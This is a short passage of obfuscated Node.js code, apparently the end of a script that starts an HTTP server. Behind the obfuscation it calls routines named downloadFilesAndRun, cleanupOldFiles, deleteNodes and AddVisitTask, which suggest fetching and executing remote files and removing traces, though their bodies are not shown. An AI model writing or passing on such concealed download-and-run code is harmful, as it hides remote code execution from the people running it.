_0x5ea510=_0x2625d0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1d818a){console[_0x5ea510(0x210)]('Error\x20in\x20startserver:',_0x1d818a);}}startserver()['catch'](_0x5a4e23=>{const _0x13a2d1=_0x2625d0;console[_0x13a2d1(0x210)](_0x13a2d1(0x1d6),_0x5a4e23);}),app[_0x2625d0(0x190)](PORT,()=>console[_0x2625d0(0x219)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
